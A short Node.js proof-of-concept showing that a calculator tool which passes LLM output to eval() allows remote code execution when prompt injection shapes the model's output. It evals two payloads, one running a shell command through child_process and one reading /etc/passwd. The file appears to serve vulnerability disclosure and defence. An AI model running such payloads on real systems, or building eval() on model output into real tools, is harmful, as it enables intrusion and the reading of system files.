/**
 * PoC: eval() on model-controlled expression = RCE
 *
 * Simulates the flow: user prompt influences model -> model outputs
 * expression -> eval(expression). With prompt injection, expression
 * can be arbitrary code.
 *
 * Run: node poc.js
 */

// Simulated "model" output - in reality, prompt injection shapes this
const maliciousExpressions = [
  "require('child_process').execSync('echo RCE_SUCCESS').toString()",
  "require('fs').readFileSync('/etc/passwd', 'utf8')",
];

console.log('[PoC] Calculator tool uses eval(expression) on LLM output.\n');

for (const expr of maliciousExpressions) {
  try {
    const result = eval(expr);
    console.log(`Expression: ${expr.slice(0, 50)}...`);
    console.log(`Result: ${String(result).slice(0, 80)}`);
    if (String(result).includes('RCE_SUCCESS')) {
      console.log('>>> RCE CONFIRMED: Arbitrary code executed via eval().');
    }
    console.log('');
  } catch (e) {
    console.log(`Expression: ${expr.slice(0, 50)}... -> Error: ${e.message}\n`);
  }
}
